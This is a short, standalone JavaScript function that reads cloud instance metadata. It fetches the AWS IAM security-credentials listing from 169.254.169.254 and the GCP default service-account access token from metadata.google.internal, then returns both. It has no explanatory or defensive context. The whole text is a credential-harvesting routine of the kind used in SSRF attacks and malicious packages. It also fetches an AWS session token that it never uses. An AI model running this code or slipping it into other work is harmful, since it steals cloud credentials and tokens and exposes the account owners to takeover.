async function metadata() {
    await fetch("http://169.254.169.254/latest/api/token", {method: "PUT",
        headers: {"X-aws-ec2-metadata-token-ttl-seconds": "300"}});
    const aws = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    const gcp = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
        headers: {"Metadata-Flavor": "Google"}
    });
    return [await aws.text(), await gcp.text()];
}
